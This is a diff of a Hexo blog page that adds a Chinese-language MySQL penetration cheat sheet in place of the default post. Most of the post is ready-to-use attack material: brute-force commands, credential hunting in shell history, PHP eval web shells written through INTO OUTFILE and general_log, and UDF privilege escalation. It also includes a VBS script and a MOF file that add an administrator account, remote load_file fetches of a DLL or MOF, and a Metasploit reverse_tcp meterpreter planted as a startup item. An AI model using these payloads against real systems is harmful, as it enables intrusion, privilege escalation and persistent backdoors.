@@ -6,18 +6,19 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>Hello World | 不过是块石头而已</title>
+  <title>MySQL渗透相关 | 不过是块石头而已</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+  <meta name="description" content="Mysql渗透相关Mysql相关">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Hello World">
-<meta property="og:url" content="http://example.com/2022/04/27/hello-world/index.html">
+<meta property="og:title" content="MySQL渗透相关">
+<meta property="og:url" content="http://example.com/2022/04/29/MySQL%E6%B8%97%E9%80%8F%E7%9B%B8%E5%85%B3/index.html">
 <meta property="og:site_name" content="不过是块石头而已">
-<meta property="og:description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+<meta property="og:description" content="Mysql渗透相关Mysql相关">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2022-04-27T07:10:28.422Z">
-<meta property="article:modified_time" content="2022-04-27T07:10:28.422Z">
+<meta property="article:published_time" content="2022-04-29T06:20:57.000Z">
+<meta property="article:modified_time" content="2022-04-29T06:21:51.943Z">
 <meta property="article:author" content="lam">
+<meta property="article:tag" content="渗透">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternative" href="/atom.xml" title="不过是块石头而已" type="application/atom+xml">
@@ -154,39 +155,229 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-hello-world" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-MySQL渗透相关" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      Hello World
+      MySQL渗透相关
     </h1>
   
 
         
-        <a href="/2022/04/27/hello-world/" class="archive-article-date">
-  	<time datetime="2022-04-27T07:10:28.422Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-04-27</time>
+        <a href="/2022/04/29/MySQL%E6%B8%97%E9%80%8F%E7%9B%B8%E5%85%B3/" class="archive-article-date">
+  	<time datetime="2022-04-29T06:20:57.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-04-29</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre><code class="bash">$ hexo new &quot;My New Post&quot;
+        <h3 id="Mysql渗透相关"><a href="#Mysql渗透相关" class="headerlink" title="Mysql渗透相关"></a>Mysql渗透相关</h3><p>Mysql相关</p>
+<span id="more"></span>
+
+<h4 id="一、Mysql相关信息收集"><a href="#一、Mysql相关信息收集" class="headerlink" title="一、Mysql相关信息收集"></a>一、Mysql相关信息收集</h4><p>注意Mysql默认不支持远程登录，当管理员没有开启远程连接时，下列一些远程信息收集和弱口令爆破是无效的。</p>
+<h5 id="1-端口信息收集"><a href="#1-端口信息收集" class="headerlink" title="1. 端口信息收集"></a>1. 端口信息收集</h5><p>Mysql默认端口是3306，也有自定义端口。</p>
+<p>Mysql默认不支持远程登录</p>
+<p>用nmap扫描和批量探测：</p>
+<pre><code>nmap -sV x.x.x.x           #特定目标扫描
+nmap -p 3306 x.x.x.x/24    #批量探测
 </code></pre>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre><code class="bash">$ hexo server
+<h5 id="2-版本信息收集"><a href="#2-版本信息收集" class="headerlink" title="2. 版本信息收集"></a>2. 版本信息收集</h5><p>Mysql语句查询：</p>
+<pre><code>SELECT @@version;SELECT version();
 </code></pre>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre><code class="bash">$ hexo generate
+<p>通过msf收集Mysql版本信息：</p>
+<pre><code>#获取MySQL相关信息auxiliary/scanner/mysql/mysql_version
 </code></pre>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre><code class="bash">$ hexo deploy
+<p>通过sqlmap利用注入点扫描信息：</p>
+<pre><code>python sqlmap.py -u url --dbms mysql
 </code></pre>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+<h5 id="3-路径信息收集"><a href="#3-路径信息收集" class="headerlink" title="3. 路径信息收集"></a>3. 路径信息收集</h5><pre><code>#查看mysql安装路径
+select @@basedir;
+show variables like &#39;%plugin%&#39;;
+
+#查看数据库文件的存放路径
+select @@datadir;
+</code></pre>
+<h5 id="4-数据库管理信息收集"><a href="#4-数据库管理信息收集" class="headerlink" title="4. 数据库管理信息收集"></a>4. 数据库管理信息收集</h5><p>Mysql管理工具有很多，例如phpmyadmin、MysqlFront等。</p>
+<h5 id="5-Mysql密码获取"><a href="#5-Mysql密码获取" class="headerlink" title="5. Mysql密码获取"></a>5. Mysql密码获取</h5><p>1). 通过网站源码配置文件</p>
+<p>查看数据库连接配置文件，如<code>config.php</code></p>
+<p>2). 对user表中的哈希值尝试解密</p>
+<p>通过SQL注入等方式查询mysql库的user表，或读取到<code>user.myd</code>存储文件，拿到其中root的hash值密码</p>
+<p>md5解密：<a target="_blank" rel="noopener" href="https://www.cmd5.com/%E3%80%82%E9%80%89%E6%8B%A9mysql5">https://www.cmd5.com/。选择mysql5</a>.</p>
+<p>3). nmap扫描爆破</p>
+<pre><code>#对一个IP或IP段进行root默认密码暴力破解
+nmap -p 3306 --script=mysql-brute.nse 192.168.1.1
+#自定义账号和密码字典n
+map -p 3306 --script=mysql-brute.nse userdb=/db_user.txt passdb=/db_pass.txt 192.168.1.1
+#检查mysql root空口令
+nmap --script=mysql-empty-password.nse 192.168.1.1
+</code></pre>
+<p>4). msf模块爆破</p>
+<pre><code>#使用msf指定模块
+auxiliary/scanner/mysql/mysql_login
+#可使用已知口令对内网mysql进行探测
+set RHOSTS 192.168.1.1-254
+#也使用密码字典进行暴力破解尝试
+set pass_file /pass.txt
+</code></pre>
+<p>5). 弱口令检查工具</p>
+<p><strong>SNETCracker</strong></p>
+<p>地址：<a target="_blank" rel="noopener" href="https://github.com/shack2/SNETCracker">https://github.com/shack2/SNETCracker</a></p>
+<p>6). 如果目标是linux系统，可以尝试查看系统的历史命令寻找是否有密码</p>
+<pre><code>/root/.mysql_history
+/root/.bash_history
+</code></pre>
+<h4 id="二、Mysql拿shell"><a href="#二、Mysql拿shell" class="headerlink" title="二、Mysql拿shell"></a>二、Mysql拿shell</h4><h5 id="1-利用-into-outfile-写shell"><a href="#1-利用-into-outfile-写shell" class="headerlink" title="1. 利用 into outfile 写shell"></a>1. 利用 into outfile 写shell</h5><p><strong>前提条件</strong>：</p>
+<ul>
+<li>可执行SQL语句（通过注入或数据库管理后台）</li>
+<li>当前数据库用户具有写入权限（root权限或与root相同权力的用户即可）</li>
+<li>知道Web绝对路径</li>
+<li><code>secure_file_priv</code>选项支持数据导出（无确定值）</li>
+</ul>
+<p><code>secure_file_priv</code>参数在<strong>Mysql 5.7.6</strong>被引入，且默认值为<code>NULL</code>。</p>
+<pre><code>show variables like &#39;%secure_file_priv%&#39;;
+</code></pre>
+<p>该参数用于限制<code>select...into outfile...</code>、<code>load_file()</code>导出到或读取哪个指定的目录。值为<code>NULL</code>时，表示限制mysq不允许导入导出。</p>
+<p><strong>使用 select 直接导出</strong></p>
+<pre><code>select 1,&quot;&lt;?php @eval($_POST[shell]);?&gt;&quot;,3 into outfile &#39;D:/www/x.php&#39; --+
+
+#对一句话进行十六进制编码select 1,0x3c3f70687020406576616c28245f504f53545b77686f616d695d293b3f3e,3 into outfile &quot;D:/www/x.php&quot;--+
+
+#创建数据库并导出shell
+CREATE TABLE `mysql`.`xxx` (`temp` TEXT NOTNULL );
+INSERT INTO `mysql`.`xxx` (`temp` ) VALUES(&#39;&lt;?php @eval($_POST[shell]);?&gt;&#39;);
+SELECT `temp` FROM `xxx` INTO OUTFILE&#39;D:/www/x.php&#39;;DROP TABLE IF EXISTS `xxx`;
+</code></pre>
+<p><strong>使用分隔符写入WebShell</strong></p>
+<p>当sql注入点为盲注或基于报错的注入时，Union select 写入的方式显然是利用不了的，我们可以通过分隔符写入WebShell。</p>
+<pre><code>?id=1 into outfile &#39;D:/www/x.php&#39; lines terminated by 一句话hex编码#
+?id=1 into outfile &#39;D:/www/x.php&#39; fields terminated by 一句话hex编码#
+?id=1 into outfile &#39;D:/www/x.php&#39; columns terminated by 一句话hex编码#
+?id=1 into outfile &#39;D:/www/x.php&#39; lines starting by 一句话hex编码#
+</code></pre>
+<p><strong>利用sqlmap直接拿shell</strong></p>
+<pre><code>sqlmap -u url --os-shell echo &quot;&lt;?php @eval($_POST[shell]);?&gt;&quot; &gt; D:/www/x.php
+</code></pre>
+<p>sqlmap执行命令的原理也是通过<code>into outfile</code>导出写入一个cmd shell文件，再进一步利用。因此同样需要root权限和<code>secure_file_priv</code>选项不限制。</p>
+<h5 id="2-利用general-log日志写入WebShell"><a href="#2-利用general-log日志写入WebShell" class="headerlink" title="2. 利用general_log日志写入WebShell"></a>2. 利用general_log日志写入WebShell</h5><p>该方法不受参数<code>secure_file_priv</code>的限制。</p>
+<p>Mysql查询日志用来保存所有跟查询相关的日志，我们可以通过指定mysql日志的存放路径来往目标主机上写入webshell，但是也要对生成的日志有可读可写的权限。这种日志类型默认是关闭状态的。</p>
+<pre><code>show variables like &#39;%general%&#39;;
+</code></pre>
+<ul>
+<li>general_log 指定日志保存状态，一共有两个值（ON&#x2F;OFF）ON代表开启 OFF 代表关闭。</li>
+<li>general_log_file 指的是日志的保存路径</li>
+</ul>
+<pre><code>#开启general log模式,将所有到达MySQL Server的SQL语句记录下来
+set global general_log = ON;    
+#设置日志文件地址set global general_log_file = &#39;D:/www/x.php&#39;;    
+#查询一句话,此时日志文件shell.php中将写入webshellselect &#39;&lt;?php eval($_POST[whoami]);?&gt;&#39;;   
+#关闭general log模式set global general_log=OFF;              
+</code></pre>
+<p><strong>注意</strong>：在 Linux 系统中权限分配十分严格，MySQL 用户一般情况下是无法直接往web根目录写入文件的，即便成功，写入的文件的权限也是MySQL的，Apache也是无法访问的，所以，以上方法通常是在Windows系统中适用。</p>
+<h4 id="三、Mysql提权"><a href="#三、Mysql提权" class="headerlink" title="三、Mysql提权"></a>三、Mysql提权</h4><h5 id="1-UDF提权"><a href="#1-UDF提权" class="headerlink" title="1. UDF提权"></a>1. UDF提权</h5><p><strong>原理</strong>：UDF（Userdefined function），即用户自定义函数。利用<code>select dumpfile</code>语句导入恶意的<code>udf.dll</code>文件，在其中定义可执行系统命令的mysql函数并创建，之后可在sql语句中通过调用函数来执行系统命令。</p>
+<p><strong>前提条件</strong>：</p>
+<ul>
+<li>当前mysql用户有权限写入文件和引入函数。</li>
+<li><code>secure_file_priv</code>参数允许写到plugin目录下，即为<code>NULL</code>。</li>
+<li>如果MySQL版本小于5.0.67且为Windows系统，则udf.dll文件存放在 C:\windows 或者 C:\windows\system32 目录下。</li>
+<li>如果MySQL版本大于5.0.67，<code>udf.dll</code>文件必须放置在MySQL安装目录的<code>lib/plugin</code>文件夹下，该plugin目录默认不存在需要创建。</li>
+</ul>
+<p><strong>提权步骤</strong>：</p>
+<p>判断mysql版本和<code>secure_file_priv</code>参数后，查看主机版本架构及plugin目录：</p>
+<pre><code>show variables like &#39;%compile%&#39;;    #查看主机版本及架构
+show variables like &#39;%plugin%&#39;;     #查看plugin目录
+</code></pre>
+<p>在<code>/usr/share/metasploit-framework/data/exploits/mysql</code>目录下找到包含64位和32位Linux和Windows系统下利用的动态链接库文件，其中<code>dll</code>后缀适用于windows系统，<code>so</code>后缀适用于linux系统。</p>
+<p><strong>1). 手动udf提权</strong></p>
+<p>可以选择手动写入：</p>
+<p>先得到udf文件的十六进制数据：</p>
+<pre><code>select hex(load_file(&#39;D:/lib_mysqludf_sys_64.dll&#39;)) into outfile &quot;D:/udf64.hex&quot;；
+</code></pre>
+<p>创建一个表，再将内容的十六进制数据分段写入表中，最后导出至udf文件：</p>
+<pre><code>#创建temp表并将udf的16进制数据写入data字段
+create table temp(data longblob);insert into temp(data) values (0x..);update temp set data = concat(data,0x..);
+
+
+#导出数据到udf文件select data from temp into dumpfile &quot;D:/server/mysql/lib/plugin/udf.dll&quot;;
+</code></pre>
+<p>从Mysql 5.6.1开始，也可以用base64编码进行写入：</p>
+<pre><code>#得到base64编码数据select to_base64(load_file(&#39;D:/lib_mysqludf_sys_64.dll&#39;)) into outfile &quot;D:/udf64.b64&quot; 
+#利用into dumpfile写入dllselect from_base64(&quot;xx&quot;) into dumpfile &quot;D:/server/mysql/lib/plugin/udf.dll&quot;;
+</code></pre>
+<p>也可以利用<code>load_file()</code>函数，远程加载服务器上的udf文件，并下载至指定目录：</p>
+<pre><code>select load_file(&#39;\\\\x.x.x.x\udf.dll&#39;) into dumpfile &quot;D:/server/mysql/lib/plugin/udf.dll&quot;;
+</code></pre>
+<p>成功导入<code>udf.dll</code>文件后，引入自定义函数：</p>
+<pre><code>create function sys_eval returns string soname &#39;udf.dll&#39;;
+</code></pre>
+<p>引入函数后，可以查看mysql函数里是否新增了<code>sys_eval</code>函数：</p>
+<pre><code>select * from mysql.func;
+</code></pre>
+<p>最后可以执行函数去执行系统命令：</p>
+<pre><code>select sys_eval(&#39;whoami&#39;);
+</code></pre>
+<p>linux系统的权限管理比较严格，可能依然是mysql权限，如果是Windows系统的话一般是Administrator权限。</p>
+<p>清理自定义函数：</p>
+<pre><code>drop function sys_eval;
+</code></pre>
+<p><strong>2). 利用msf进行udf提权</strong></p>
+<pre><code>use exploit/multi/mysql/mysql_udf_payload
+</code></pre>
+<p>MSF会将一个随机命名的UDF文件写入lib&#x2F;plugin目录下（如果该目录不存在的话，则无法执行成功），该UDF文件中包含sys_exec()和sys_eval()这两个函数，但是默认只创建sys_exec()函数，该函数执行并不会有回显。我们可以手动引入 sys_eval() 函数，来执行有回显的命令。</p>
+<pre><code>create function sys_eval returns string soname &#39;xxx.dll&#39;;
+</code></pre>
+<p><strong>补充</strong>：导入的udf文件后缀可以自己命名，对创建函数没有影响。</p>
+<h5 id="2-启动项"><a href="#2-启动项" class="headerlink" title="2. 启动项"></a>2. 启动项</h5><p>即将自定义的脚本写入到开机自启动目录下，如果服务器重启，则会执行其中的恶意脚本。</p>
+<p>由于同样要用到<code>dumpfile</code>方法进行导出写入脚本或木马，因此同样需要权限和<code>secure_file_priv</code>参数没有限制。</p>
+<p>其中恶意脚本可以是vbs脚本，用于执行cmd命令并创建一个系统管理员用户：</p>
+<pre><code>Set WshShell=WScript.CreateObject(&quot;WScript.Shell&quot;)
+WshShell.Run &quot;net user hack admin!@#45 /add&quot;, 0
+WshShell.Run &quot;net localgroup administrators whoami /add&quot;, 0
+</code></pre>
+<p>恶意脚本也可以直接是exe木马，启动后上线msf或cs。</p>
+<p><strong>手动写入</strong>：对vbs脚本或exe脚本先用mysql的<code>hex()</code>函数进行十六进制编码，然后使用上述的手动分段写入的方法写入到Windows启动项目录下：</p>
+<pre><code>select hex(load_file(&#39;shell.exe&#39;)) into outfile &quot;shell.hex&quot;;
+select 0x... into dumpfile &#39;C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\x.exe&#39;;
+</code></pre>
+<p><strong>利用msf写入启动项</strong>：</p>
+<pre><code>use exploit/windows/mysql/mysql_start_up
+set payload windows/meterpreter/reverse_tcp
+set lhost x.x.x.xset lport 4444set rhosts 192.168.1.1     #目标ip
+set username rootset password rootset startup_folder xxx     #根据目标系统设置自启目录exploit
+</code></pre>
+<p>执行后，msf将在目标主机启动项生成exe的木马，启动后会上线得到meterpreter会话。</p>
+<h5 id="3-MOF提权"><a href="#3-MOF提权" class="headerlink" title="3. MOF提权"></a>3. MOF提权</h5><p>将含有恶意命令的mof文件替换掉原mof通过mysql导入到Windows指定目录。导入后系统会执行其中的恶意命令，如添加管理员用户。</p>
+<pre><code>select load_file(&#39;\\\\x.x.x.x\nullevt.mof&#39;) into dumpfile &#39;c:/windows/system32/wbem/mof/nullevt.mof&#39;;
+</code></pre>
+<p>具体操作和udf提权类似。</p>
+<p>mof文件内容：</p>
+<pre><code>#pragma namespace(&quot;\\\\.\\root\\subscription&quot;) 
+instance of __EventFilter as $EventFilter
+&#123; 
+EventNamespace = &quot;Root\\Cimv2&quot;; 
+Name = &quot;filtP2&quot;; 
+Query = &quot;Select \ From __InstanceModificationEvent &quot; 
+&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot; 
+&quot;And TargetInstance.Second = 5&quot;; 
+QueryLanguage = &quot;WQL&quot;; 
+&#125;; 
+ 
+instance of ActiveScriptEventConsumer as $Consumer 
+&#123; 
+Name = &quot;consPCSV2&quot;; 
+ScriptingEngine = &quot;JScript&quot;; 
+ScriptText = 
+&quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user hack admin!@#45 /add&quot;)&quot;; 
+&#125;; 
+instance of __FilterToConsumerBinding
+&#123; 
+Consumer = $Consumer; 
+Filter = $EventFilter; 
+&#125;;
+</code></pre>
 
       
 
@@ -216,6 +407,17 @@
     <div class="article-info article-info-index">
       
       
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">渗透</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
       
 
       
@@ -266,7 +468,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2022/04/27/hello-world/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2022/04/29/MySQL%E6%B8%97%E9%80%8F%E7%9B%B8%E5%85%B3/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -280,15 +482,11 @@
   
 <nav id="article-nav">
   
-    <a href="/2022/04/27/Dont-hit-without-hesitation/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          Dont hit without hesitation
-        
-      </div>
-    </a>
   
+    <a href="/2022/04/29/linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">linux应急响应</div>
+      <i class="icon-circle-right"></i>
+    </a>
   
 </nav>
 
